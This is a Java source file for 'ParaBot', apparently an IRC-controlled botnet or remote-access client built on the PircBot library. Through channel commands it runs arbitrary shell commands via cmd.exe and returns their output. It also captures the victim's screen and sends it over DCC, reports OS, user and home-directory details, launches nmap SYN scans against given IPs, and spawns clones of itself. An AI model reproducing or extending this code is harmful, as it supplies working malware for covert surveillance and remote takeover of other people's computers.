import com.sun.javafx.runtime.SystemProperties;
import org.jibble.pircbot.*;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.concurrent.*;
import java.util.function.Consumer;
import java.util.regex.*;
import java.util.Random;
import java.util.*;
import java.lang.*;

public class ParaBot extends PircBot{
    private int id;
    private String name;

    private final int MAX = 10;

    private int port = 8080;
    private int currPort = port;

    private Socket socket;
    private Socket objSocket;

    private Random rand;
    private ExecutorService jobs = Executors.newFixedThreadPool(MAX);

    private Process process;
    private Process mainTerminal;

    private Future processedInput;

    private BufferedReader input;
    private PrintStream output;
    private ObjectInputStream objInput;
    private ObjectOutputStream objOut;

    public String host = " system properties "+System.getProperty("os.name")+
            "  system user id "+System.getProperty("user.dir") +
            "  system operating system version "+System.getProperty("os.version") +
            "  system architecture "+System.getProperty("os.arch")+
            "  system home directory "+System.getProperty("user.home");
    public ParaBot(){
        this.rand = new Random();
        this.id = rand.nextInt(100);
        byte[]bytes = new byte[7];
        rand.nextBytes(bytes);
        this.name = new String(bytes, Charset.forName("UTF-8"));
        this.setName("B"+name.hashCode()+"T");
    }
    public boolean spawnClone(){
        try{
            Runnable clone = ()->{
                String command = "javac -classpath pircbot.jar;. *.java && javaw -classpath pircbot.jar; TestBotMain main";
                terminalCommander(command,false);
            };
            jobs.submit(clone);
            return true;
        }catch(Exception e){
            e.printStackTrace();
        }
        return false;
    }
    public boolean initiateClient(int port){
        try{
            socket = new Socket("localhost",port);
            input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            output = new PrintStream(socket.getOutputStream());
        }catch(IOException e){
            e.printStackTrace();
            System.out.println("Error initiating client");
        }
        return false;
    }
    public void sendProcess(final String command){
       try{

           Callable<String>serverJob = ()->{
               String[]toDo = {"cmd","/C","start",command};

               tellServer("process");
               int port = 9879;
               objSocket = new Socket("localhost",port);
               objOut = new ObjectOutputStream(objSocket.getOutputStream());
               objOut.writeObject(toDo);
               objInput = new ObjectInputStream(objSocket.getInputStream());
               String response = objInput.readUTF();

               objInput.close();
               objOut.close();
               //objSocket.close();
               return response;
           };
           processedInput = jobs.submit(serverJob);
       }catch(Exception e){
           e.printStackTrace();
       }
    }
    public boolean initiateServer(String type){
        if(currPort != port){
            currPort = port;
        }

        String id = Integer.toString(this.id);
        String command = "java -classpath .;. Server "+id+" "+port++ +" "+type;
        process = terminalCommander(command,false);
        initiateClient(currPort);
        return socket.isConnected();
    }
    public void getScreenCapture(){
        try{
            Robot usr = new Robot();
            String file = "ScreenShot.jpg";
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = usr.createScreenCapture(screenRect);
            ImageIO.write(screenFullImage, "jpg", new File(file));
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void performScan(String ip){
        String start = "nmap -sS -T3 "+ip+" > "+ System.getProperty("user.dir")+"/output.txt && exit";
        Runnable scan = ()->{
            Process nmap = terminalCommander(start,false);
            try{
                nmap.waitFor();
                nmap.destroy();
            }catch(Exception e){
                e.printStackTrace();
            }
        };
        jobs.submit(scan);
    }
    public void useTerminal(String command){
        String start = command+" > "+System.getProperty("user.dir")+"/output.txt && exit";
        Process process = terminalCommander(start,true);
        process.destroy();
    }
    public Process terminalCommander(String command,boolean suppress){
        try{

            String start = suppress == true?"cmd /c start /B cmd.exe":"cmd /c start cmd.exe";
            String cmd = " /K \""+command+"\"";

            Process process = Runtime.getRuntime().exec(start+cmd);
            return process;
        }catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }
    public void handlePersonalCommand(String channel,String sender,String command){
        if(command.contains("#init")){
            Boolean success = initiateServer("server");
            sendMessage(channel,sender+" initiated server "+success);
            sendMessage(channel,sender+"address "+socket.getRemoteSocketAddress()+" local port "+socket.getLocalPort());
        }
        if(command.split(" ")[0].equalsIgnoreCase("#getProcess")){
            StringBuffer buff = new StringBuffer();
            tellServer("retrieve");
            try{
                buff.append((String)processedInput.get(2,TimeUnit.SECONDS));
            }catch(Exception e){
                e.printStackTrace();
                buff.append("failed to get input");
            }
            sendMessage(channel,sender+" process response: "+buff.toString());
        }
        if(command.contains("#snapshot")){
            getScreenCapture();
            File file = new File(System.getProperty("user.dir")+"/Screenshot.jpg");
            dccSendFile(file,sender,120000);
        }
        if(command.contains("#private")){
            dccSendChatRequest(sender,120000);
        }
        if(command.contains("#host")){
            sendMessage(channel,sender+" host details are "+host);
        }
        if(command.contains("#getOutput")){
            StringBuffer ret = new StringBuffer();
            try{
                File file = new File(System.getProperty("user.dir")+"/output.txt");
                sendMessage(channel,sender+"results: ");
                if(file.exists()){
                    Scanner reader = new Scanner(file);
                    while(reader.hasNext()){
                        sendMessage(channel,reader.nextLine());
                        ret.append(reader.next()+" ");
                    }
                }
            }catch(Exception e){
                e.printStackTrace();
            }
            sendMessage(channel,sender+"results end ");
        }
        if(command.split(" ")[0].equalsIgnoreCase("#scan")){
            performScan(command.split(" ")[1]);
            sendMessage(channel,sender+" scan done");
        }
        if(command.split(" ")[0].equalsIgnoreCase("#clone")){
            sendMessage(channel,sender+" spawned clone "+spawnClone());
        }
        if(command.split(" ")[0].equalsIgnoreCase("#command")){
            StringBuffer buff = new StringBuffer();
            String[]cmd = command.split(" ");
            for(int i=1;i<cmd.length;i++){
                buff.append(cmd[i]);
            }
            useTerminal(buff.toString());
        }
        if(command.split(" ")[0].equalsIgnoreCase("#sendProcess")){
            StringBuffer buff = new StringBuffer();
            String[]cmd = command.split(" ");
            for(int i=1;i<cmd.length;i++){
                buff.append(cmd[i]);
            }
            sendProcess(cmd.toString());
            sendMessage(channel,sender+" process sent");
        }

        if(command.split(" ")[0].equalsIgnoreCase("#tell")){
            StringBuffer buff = new StringBuffer();
            String[]cmd = command.split(" ");
            for(int i=1;i<cmd.length;i++){
                buff.append(cmd[i]+" ");
            }
            String ret = tellServer(buff.toString());
            sendMessage(channel,sender+" message sent");
            sendMessage(channel,sender+" server response:"+ret);
        }
    }
    public String tellServer(String message){
        try{
            String remove = "#tell";
            String line = message.substring(0);
            output.println(line);
            String response = input.readLine();
            output.flush();
            return response;
        }catch(Exception e){
            e.printStackTrace();
        }
        return "no response";
    }
    public void onDisconnect(){
        int count = 0;
        while(!isConnected() && count < 20){
            try{
                reconnect();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
    public void onMessage(String channel,String sender,String login,String hostName,String message) {
        if (message.equalsIgnoreCase("#time")) {
            String time = new java.util.Date().toString();
            sendMessage(channel, sender+" the current Time is " + time);
        }
        if(message.equalsIgnoreCase("#identify")){
            sendMessage(channel,sender+" ID="+id);
        }
        if(message.split(" ")[0].equalsIgnoreCase("#call")){
            String[] input = message.split(" ");
            StringBuffer command = new StringBuffer();
            if(input[1].equalsIgnoreCase(Integer.toString(id))){
                for(int i=2;i<input.length;i++){
                    command.append(input[i]+" ");
                }
                if(command.toString().contains("#close")){
                    try{
                        disconnect();
                        output.close();
                        System.exit(0);
                    }catch(Exception e){
                        e.printStackTrace();
                    }
                }else{
                    handlePersonalCommand(channel,sender, command.toString());
                }
            }
        }
    }
}
